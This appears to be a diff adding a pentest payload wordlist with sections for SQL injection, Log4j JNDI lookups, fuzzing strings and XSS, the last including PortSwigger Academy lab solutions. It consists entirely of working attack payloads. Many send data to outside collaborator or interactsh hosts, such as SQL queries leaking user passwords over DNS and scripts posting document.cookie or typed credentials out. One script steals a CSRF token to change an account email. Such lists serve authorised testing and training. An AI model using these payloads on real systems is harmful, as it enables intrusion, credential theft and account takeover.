@@ -1,0 +1,506 @@
+* Selected Options: Advance SQL Injection,,,Generic SQL Injection,,,Log4j,,,Fuzzing Append,,,Fuzzing Replace,,,Common XSS,,,Portswigger XSS Academy
+********************************************************************************************************************************************************************************************************
+-Type: Advance SQL Injection
+' and conv('a',16,2)=conv('a',16,2)
+' and connection_id()=connection_id()
+' and crc32('MySQL')=crc32('MySQL')
+' and BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)
+' and @@CONNECTIONS>0
+' and @@CONNECTIONS=@@CONNECTIONS
+' and @@CPU_BUSY=@@CPU_BUSY
+' and USER_ID(1)=USER_ID(1)
+' and ROWNUM=ROWNUM
+' and RAWTOHEX('AB')=RAWTOHEX('AB')
+' and LNNVL(0=123)
+' and 5::int=5
+' and 5::integer=5
+' and pg_client_encoding()=pg_client_encoding()
+' and get_current_ts_config()=get_current_ts_config()
+' and quote_literal(42.5)=quote_literal(42.5)
+' and current_database()=current_database()
+' and sqlite_version()=sqlite_version()
+' and last_insert_rowid()>1
+' and last_insert_rowid()=last_insert_rowid()
+' and val(cvar(1))=1
+' and IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0
+' and cdbl(1)=cdbl(1)
+(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % ceqxd SYSTEM \"http://noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net/\">%ceqxd;]>'),'/l') from dual)
+'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % ceqxd SYSTEM \"http://noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net/\">%ceqxd;]>'),'/l') from dual) || '1
+\"||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % ceqxd SYSTEM \"http://noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net/\">%ceqxd;]>'),'/l') from dual) || \"1
+ 1=(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % ceqxd SYSTEM \"http://noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net/\">%ceqxd;]>'),'/l') from dual)
+ AND 123123=123123;declare @q varchar(99);set @q='\\\\noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\eee'; exec master.dbo.xp_dirtree @q;-- -
+ AND 123123=DBMS_PIPE.RECEIVE_MESSAGE('aaa',10)
+ AND 123123=DBMS_PIPE.RECEIVE_MESSAGE('aaa',10) -- 
+zxcs' AND 123123=DBMS_PIPE.RECEIVE_MESSAGE('aaa',10) AND '1'='
+zxcs' AND 123123=DBMS_PIPE.RECEIVE_MESSAGE('aaa',10) -- 
+zxcs\" AND 123123=DBMS_PIPE.RECEIVE_MESSAGE('aaa',10) AND '1'='
+zxcs\" AND 123123=DBMS_PIPE.RECEIVE_MESSAGE('aaa',10) -- 
+ AND SLEeP(10) -- -
+' AND SLEeP(10) -- -
+\" AND SLEeP(10) -- -
+SLEeP(10) /*' AND SLEeP(10) AND '\" AND SLEeP(10) AND \"*/
+'XOR(if(1,SLEeP(10),0))XOR'z
+\"XOR(if(1,SLEeP(10),0))XOR\"z
+\"/**/OR/**/\"randomzz\"=\"randomzz
+'/**/OR/**/'randomzz'='randomzz
+ OR 1166=1166 -- sdjw
+ OR 1145=1145 OR 1=
+' OR eLt(true, true)-- ggg
+\"' and 1=(select 'random' into outfile '\\\\noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\temp\\out.txt') and 'z'='
+\"' and 1=(select 'random' into dumpfile '\\\\noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\temp\\out.txt') and 'z'='
+\"' and 1=(select load_file(concat('\\\\',version(),'.noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\a.txt'))) and 'z'='
+\" and 1=(select 'random' into outfile '\\\\noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\temp\\out.txt') and 'z'='
+\" and 1=(select 'random' into dumpfile '\\\\noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\temp\\out.txt') and 'z'='
+\" and 1=(select load_file(concat('\\\\',version(),'.noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\a.txt'))) and 'z'='
+';DECLARE @x char(9);set @x=0x303a303a3130;WAITFOR DELAY @x; -- -
+');DECLARE @x char(9);set @x=0x303a303a3130;WAITFOR DELAY @x; -- -
+'));DECLARE @x char(9);set @x=0x303a303a3130;WAITFOR DELAY @x; -- -
+;DECLARE @x char(9);set @x=0x303a303a3130;WAITFOR DELAY @x; -- -
+ ;DECLARE @x char(9);set @x=0x303a303a3130;WAITFOR DELAY @x; -- -
+' and substr(version(),1,10) = 'PostgreSQL' and '1
+' and substr(version(),1,10) = 'PostgreXXX' and '1
+ and substr(version(),1,10) = 'PostgreSQL' -- 
+ and substr(version(),1,10) = 'PostgreXXX' -- 
+ AND 123123=(SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000)) -- -
+ AND 123123=(SELECT 123123 FROM PG_SLEEP(10)) -- -
+z' AND 'dwdasdw'=(SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000)) AND '1
+z' AND 'vasldjl'=(SELECT 'asdwdas' FROM PG_SLEEP(10)) AND '1
+,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
+' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
+true, $where: '1 == 1'
+', $or: [ {}, { 'a':'a
+;db.injection.insert({success:1});
+;db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+'/*
+'-- sloG
+' ORDER BY 1000 -- sloG
+' ORDER BY 1 -- sloG
+' HAVING true-- yCzR
+' HAVING false-- yCzR
+dwfwasdw<>\"'%;)(&+123123
+';EXEC master..xp_dirtree '\\\\noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\foo' --
+';declare @q varchar(1024); set @q = 'master..xp_dirtree '\\' + user_name() + '.noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\oo'; exec(@q)
+'and+exists(select+*+from+fn_xe_file_target_read_file('C:\\*.xel','\\\\'%2b(select+pass+from+users+where+id=1)%2b'.noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\1.xem',null,null))
+'%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\\\'%2b(select+pass+from+users+where+id=1)%2b'.noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\',default,default)))
+'+and+exists(select+*+from+fn_trace_gettable('\\\\'%2b(select+pass+from+users+where+id=1)%2b'.noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\1.trc',default))
+';exec master..xp_dirtree '//noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net/a
+'; declare @p varchar(1024);set @p=2;exec('master..xp_dirtree \"//'+@p+'.noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net/a\"')
+========================================================================================================================================================================================================
+-Type: Generic SQL Injection
+'
+''
+`
+``
+,
+\"
+\"\"
+/
+//
+\\
+\\\\
+;
+' or \"
+-- or # 
+' OR '1
+' OR 1 -- -
+\" OR \"\" = \"
+\" OR 1 = 1 -- -
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+ OR 1=1
+' OR 'x'='x
+' AND id IS NULL; --
+'''''''''''''UNION SELECT '2
+%00
++
+||
+%
+@variable
+@@variable
+AND 1
+AND 0
+AND true
+AND false
+1-false
+1-true
+1*56
+-2
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1' ORDER BY 1,2--+
+1' ORDER BY 1,2,3--+
+1' GROUP BY 1,2,--+
+1' GROUP BY 1,2,3--+
+' GROUP BY columnnames having 1=1 --
+-1' UNION SELECT 1,2,3--+
+' UNION SELECT sum(columnname ) from tablename --
+-1 UNION SELECT 1 INTO @,@
+-1 UNION SELECT 1 INTO @,@,@
+1 AND (SELECT * FROM Users) = 1	
+' AND MID(VERSION(),1,1) = '5';
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+,(select * from (select(sleep(10)))a)
+%2c(select%20*%20from%20(select(sleep(10)))a)
+';WAITFOR DELAY '0:0:30'--
+#
+/*
+-- -
+;%00
+' and conv('a',16,2)=conv('a',16,2)
+' and connection_id()=connection_id()
+' and crc32('MySQL')=crc32('MySQL')
+' and BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)
+' and @@CONNECTIONS>0
+' and @@CONNECTIONS=@@CONNECTIONS
+' and @@CPU_BUSY=@@CPU_BUSY
+' and USER_ID(1)=USER_ID(1)
+' and ROWNUM=ROWNUM
+' and RAWTOHEX('AB')=RAWTOHEX('AB')
+' and LNNVL(0=123)
+' and 5::int=5
+' and 5::integer=5
+' and pg_client_encoding()=pg_client_encoding()
+' and get_current_ts_config()=get_current_ts_config()
+' and quote_literal(42.5)=quote_literal(42.5)
+' and current_database()=current_database()
+' and sqlite_version()=sqlite_version()
+' and last_insert_rowid()>1
+' and last_insert_rowid()=last_insert_rowid()
+' and val(cvar(1))=1
+' and IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0
+' and cdbl(1)=cdbl(1)
+(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % ceqxd SYSTEM \"http://noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net/\">%ceqxd;]>'),'/l') from dual)
+'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % ceqxd SYSTEM \"http://noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net/\">%ceqxd;]>'),'/l') from dual) || '1
+\"||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % ceqxd SYSTEM \"http://noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net/\">%ceqxd;]>'),'/l') from dual) || \"1
+ 1=(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % ceqxd SYSTEM \"http://noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net/\">%ceqxd;]>'),'/l') from dual)
+ AND 123123=123123;declare @q varchar(99);set @q='\\\\noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\eee'; exec master.dbo.xp_dirtree @q;-- -
+ AND 123123=DBMS_PIPE.RECEIVE_MESSAGE('aaa',10)
+ AND 123123=DBMS_PIPE.RECEIVE_MESSAGE('aaa',10) -- 
+zxcs' AND 123123=DBMS_PIPE.RECEIVE_MESSAGE('aaa',10) AND '1'='
+zxcs' AND 123123=DBMS_PIPE.RECEIVE_MESSAGE('aaa',10) -- 
+zxcs\" AND 123123=DBMS_PIPE.RECEIVE_MESSAGE('aaa',10) AND '1'='
+zxcs\" AND 123123=DBMS_PIPE.RECEIVE_MESSAGE('aaa',10) -- 
+ AND SLEeP(10) -- -
+' AND SLEeP(10) -- -
+\" AND SLEeP(10) -- -
+SLEeP(10) /*' AND SLEeP(10) AND '\" AND SLEeP(10) AND \"*/
+'XOR(if(1,SLEeP(10),0))XOR'z
+\"XOR(if(1,SLEeP(10),0))XOR\"z
+\"/**/OR/**/\"randomzz\"=\"randomzz
+'/**/OR/**/'randomzz'='randomzz
+ OR 1166=1166 -- sdjw
+ OR 1145=1145 OR 1=
+' OR eLt(true, true)-- ggg
+\"' and 1=(select 'random' into outfile '\\\\noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\temp\\out.txt') and 'z'='
+\"' and 1=(select 'random' into dumpfile '\\\\noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\temp\\out.txt') and 'z'='
+\"' and 1=(select load_file(concat('\\\\',version(),'.noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\a.txt'))) and 'z'='
+\" and 1=(select 'random' into outfile '\\\\noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\temp\\out.txt') and 'z'='
+\" and 1=(select 'random' into dumpfile '\\\\noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\temp\\out.txt') and 'z'='
+\" and 1=(select load_file(concat('\\\\',version(),'.noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\a.txt'))) and 'z'='
+';DECLARE @x char(9);set @x=0x303a303a3130;WAITFOR DELAY @x; -- -
+');DECLARE @x char(9);set @x=0x303a303a3130;WAITFOR DELAY @x; -- -
+'));DECLARE @x char(9);set @x=0x303a303a3130;WAITFOR DELAY @x; -- -
+;DECLARE @x char(9);set @x=0x303a303a3130;WAITFOR DELAY @x; -- -
+ ;DECLARE @x char(9);set @x=0x303a303a3130;WAITFOR DELAY @x; -- -
+' and substr(version(),1,10) = 'PostgreSQL' and '1
+' and substr(version(),1,10) = 'PostgreXXX' and '1
+ and substr(version(),1,10) = 'PostgreSQL' -- 
+ and substr(version(),1,10) = 'PostgreXXX' -- 
+ AND 123123=(SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000)) -- -
+ AND 123123=(SELECT 123123 FROM PG_SLEEP(10)) -- -
+z' AND 'dwdasdw'=(SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000)) AND '1
+z' AND 'vasldjl'=(SELECT 'asdwdas' FROM PG_SLEEP(10)) AND '1
+,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
+' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
+true, $where: '1 == 1'
+', $or: [ {}, { 'a':'a
+;db.injection.insert({success:1});
+;db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+'/*
+'-- sloG
+' ORDER BY 1000 -- sloG
+' ORDER BY 1 -- sloG
+' HAVING true-- yCzR
+' HAVING false-- yCzR
+dwfwasdw<>\"'%;)(&+123123
+';EXEC master..xp_dirtree '\\\\noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\foo' --
+';declare @q varchar(1024); set @q = 'master..xp_dirtree '\\' + user_name() + '.noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\oo'; exec(@q)
+'and+exists(select+*+from+fn_xe_file_target_read_file('C:\\*.xel','\\\\'%2b(select+pass+from+users+where+id=1)%2b'.noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\1.xem',null,null))
+'%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\\\'%2b(select+pass+from+users+where+id=1)%2b'.noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\',default,default)))
+'+and+exists(select+*+from+fn_trace_gettable('\\\\'%2b(select+pass+from+users+where+id=1)%2b'.noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net\\1.trc',default))
+';exec master..xp_dirtree '//noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net/a
+'; declare @p varchar(1024);set @p=2;exec('master..xp_dirtree \"//'+@p+'.noff0yuiae0dwri3spifnjzqthz7nw.burpcollaborator.net/a\"')
+========================================================================================================================================================================================================
+-Type: Log4j
+${jndi:ldap://${hostName}.{{interactsh-url}}/a}
+${jndi:ldap://${hostName}.accept.{{interactsh-url}}}
+${jndi:ldap://${hostName}.acceptencoding.{{interactsh-url}}}
+${jndi:ldap://${hostName}.acceptlanguage.{{interactsh-url}}}
+${jndi:ldap://${hostName}.accesscontrolrequestheaders.{{interactsh-url}}}
+${jndi:ldap://${hostName}.accesscontrolrequestmethod.{{interactsh-url}}}
+${jndi:ldap://${hostName}.authenticationbasic.{{interactsh-url}}}
+${jndi:ldap://${hostName}.authenticationbearer.{{interactsh-url}}}
+${jndi:ldap://${hostName}.cookiename.{{interactsh-url}}}=${jndi:ldap://${hostName}.cookievalue.{{interactsh-url}}}
+${jndi:ldap://${hostName}.location.{{interactsh-url}}}
+${jndi:ldap://${hostName}.origin.{{interactsh-url}}}
+${jndi:ldap://${hostName}.referer.{{interactsh-url}}}
+${jndi:ldap://${hostName}.upgradeinsecurerequests.{{interactsh-url}}}
+${jndi:ldap://${hostName}.useragent.{{interactsh-url}}}
+${jndi:ldap://${hostName}.xapiversion.{{interactsh-url}}}
+${jndi:ldap://${hostName}.xcsrftoken.{{interactsh-url}}}
+${jndi:ldap://${hostName}.xdruidcomment.{{interactsh-url}}}
+${jndi:ldap://${hostName}.xforwardedfor.{{interactsh-url}}}
+${jndi:ldap://${hostName}.xorigin.{{interactsh-url}}}
+${${ctx:apiversion}}
+${jndi:ldap://127.0.0.1#.${hostName}.{{interactsh-url}}/a}
+${jndi:ldap://127.0.0.1#.${hostName}.accept.{{interactsh-url}}}
+${jndi:ldap://127.0.0.1#.${hostName}.acceptencoding.{{interactsh-url}}}
+${jndi:ldap://127.0.0.1#.${hostName}.acceptlanguage.{{interactsh-url}}}
+${jndi:ldap://127.0.0.1#.${hostName}.accesscontrolrequestheaders.{{interactsh-url}}}
+${jndi:ldap://127.0.0.1#.${hostName}.accesscontrolrequestmethod.{{interactsh-url}}}
+${jndi:ldap://127.0.0.1#.${hostName}.authenticationbasic.{{interactsh-url}}}
+${jndi:ldap://127.0.0.1#.${hostName}.authenticationbearer.{{interactsh-url}}}
+${jndi:ldap://127.0.0.1#.${hostName}.cookiename.{{interactsh-url}}}=${jndi:ldap://${hostName}.cookievalue.{{interactsh-url}}}
+${jndi:ldap://127.0.0.1#.${hostName}.location.{{interactsh-url}}}
+${jndi:ldap://127.0.0.1#.${hostName}.origin.{{interactsh-url}}}
+${jndi:ldap://127.0.0.1#.${hostName}.referer.{{interactsh-url}}}
+${jndi:ldap://127.0.0.1#.${hostName}.upgradeinsecurerequests.{{interactsh-url}}}
+${jndi:ldap://127.0.0.1#.${hostName}.useragent.{{interactsh-url}}}
+${jndi:ldap://127.0.0.1#.${hostName}.xapiversion.{{interactsh-url}}}
+${jndi:ldap://127.0.0.1#.${hostName}.xcsrftoken.{{interactsh-url}}}
+${jndi:ldap://127.0.0.1#.${hostName}.xdruidcomment.{{interactsh-url}}}
+${jndi:ldap://127.0.0.1#.${hostName}.xforwardedfor.{{interactsh-url}}}
+${jndi:ldap://127.0.0.1#.${hostName}.xorigin.{{interactsh-url}}}
+${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.{{interactsh-url}}/a}
+${jn${::::::-d}i:l${::::::-d}ap://${::::::-x}${::::::-f}.{{interactsh-url}}/a}
+========================================================================================================================================================================================================
+-Type: Fuzzing Append
+/
+//
+\\
+'
+\"
+\uff07
+\u02B9
+\uff02
+\u02BA
+*
+%
+{
+[
+(
+;
+#
+>
+<
+=
+`
+-
+$
+$$
+${
+$[
+$(
+%}
+%]
+%)
+%>
+$`
+$&
+$'
+!0
+:1}
+:!0
+:!1}
+!1)
+$1)
+:$1}
+\u002e
+&apos;
+\ud888
+\xed\xa0\x80
+\x00
+\0\0\0
+\x00random
+\x0a
+\x0d
+\x08
+\x03
+\x04
+\x03random
+\x04random
+\x0b
+\x09
+\x19
+\x1b
+#//*
+ <!-- 
+ -->
+<!
+%#0123456x%08x%x%s%p%n%d%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%#0123456x%%x%%s%%p%%n%%d%%o%%u%%c%%h%%l%%q%%j%%z%%Z%%t%%i%%e%%g%%f%%a%%C%%S%%08x
+%s%s%s%s%s
+%*.*s
+%@
+%n
+$ENV{'HOME'}
+\u2215
+\u2216
+../
+%2e%2e%2f
+%c0%ae%c0%ae%c0%af
+%uff0e%uff0e%u2215
+%uff0e%uff0e%u2216
+\uff0e\uff0e\u2215
+\uff0e\uff0e\u2216
+\uc0ae\uc0ae\uc0af
+========================================================================================================================================================================================================
+-Type: Fuzzing Replace
+None
+True
+False
+"\x00"
+""
+-10
+0
+10
+[]
+[True]
+[False]
+[0]
+"undefined"
+"null"
+"'--'"
+"""||1#"""
+"""\\"""
+[[]]
+{}
+"{}"
+"{'}"
+"Date(1335205592410)"
+"new Date(1335205592410)"
+"""eval("while(1);")"""
+{":test": "1"}
+========================================================================================================================================================================================================
+-Type: Common XSS
+// Basic payload
+<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+"><script>alert('XSS')</script>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+<script>\u0061lert('22')</script>
+<script>eval('\x61lert(\'33\')')</script>
+<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
+<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
+'-alert(1)-'
+javascript:alert(1)
+
+// Img payload
+<img src=x onerror=alert('XSS');>
+<img src=x onerror=alert('XSS')//
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+"><img src=x onerror=alert('XSS');>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+
+// Svg payload
+<svg/onload=alert('XSS')>
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)//
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg id=alert(1) onload=eval(id)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(/XSS/)
+<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
+<svg><script>alert('33')
+<svg><script>alert&lpar;'33'&rpar;
+
+// Div payload
+<div onpointerover="alert(45)">MOVE HERE</div>
+<div onpointerdown="alert(45)">MOVE HERE</div>
+<div onpointerenter="alert(45)">MOVE HERE</div>
+<div onpointerleave="alert(45)">MOVE HERE</div>
+<div onpointermove="alert(45)">MOVE HERE</div>
+<div onpointerout="alert(45)">MOVE HERE</div>
+<div onpointerup="alert(45)">MOVE HERE</div>
+
+//DOM XSS in jQuery selector sink using a hashchange event
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+
+//DOM XSS
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net?'+username.value+':'+this.value);">
+========================================================================================================================================================================================================
+-Type: Portswigger XSS Academy
+<script>alert(1)</script>
+"><svg onload=alert(1)>
+<img src=1 onerror=alert(1)>
+javascript:alert(document.cookie)
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+"onmouseover="alert(1)
+javascript:alert(1)
+'-alert(1)-'
+product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
+{{$on.constructor('alert(1)')()}}
+\"-alert(1)}//
+<><img src=1 onerror=alert(1)>
+#########
+<script>
+fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+#########
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+#########
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+#########
+<iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+#########
+<script>
+location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+#########
+https://your-lab-id.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
+https://your-lab-id.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
+</script><script>alert(1)</script>
+\'-alert(1)//
+http://foo?&apos;-alert(1)-&apos;
+${alert(1)}
+https://your-lab-id.web-security-academy.net/?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
+https://your-lab-id.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+https://your-lab-id.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+<script>
+location='https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+</script>
+#########
+<script>
+if(window.name) {
+	new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
+	} else {
+		location = 'https://your-lab-id.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://your-exploit-server-id.web-security-academy.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
+}
+</script>
+
+========================================================================================================================================================================================================
